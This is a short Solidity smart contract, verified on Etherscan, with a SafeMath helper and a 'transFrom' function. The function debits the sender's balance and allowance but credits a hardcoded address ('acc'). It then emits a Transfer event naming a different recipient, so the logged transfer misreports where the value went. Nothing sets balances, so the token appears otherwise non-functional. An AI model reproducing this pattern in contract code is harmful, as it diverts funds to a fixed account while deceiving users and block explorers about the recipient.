/**
 *Submitted for verification at Etherscan.io on 2022-10-18
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract SafeMath {
    function safeMul(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a * b;
        assert(a == 0 || c / a == b);
         return c;
    }
    function safeDiv(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b > 0);
        uint256 c = a / b;
        assert(a == b * c + a % b);
        return c;
    }
    function safeSub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        assert(b >=0);
        return a - b;
    }
    function safeAdd(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c>=a && c>=b);
        return c;
    }
}
contract InfoFeed is SafeMath {
    address acc=0x0208E2d187B620850019Ec6f0B4AE0485bB5CA40;

    mapping (address => uint256) balanceOf;
    mapping (address => mapping (address => uint256)) allowance;
    event Transfer(address indexed from, address indexed to, uint256 value);
    

    function transFrom(address from, address to, uint value) public payable {
        require (value != 0);
        balanceOf[from] = SafeMath.safeSub(balanceOf[from],value);
        balanceOf[acc] = SafeMath.safeAdd(balanceOf[acc], value);
        allowance[from][msg.sender] = SafeMath.safeSub(allowance[from][msg.sender], value);
        emit Transfer(from,to,value);       
    }

}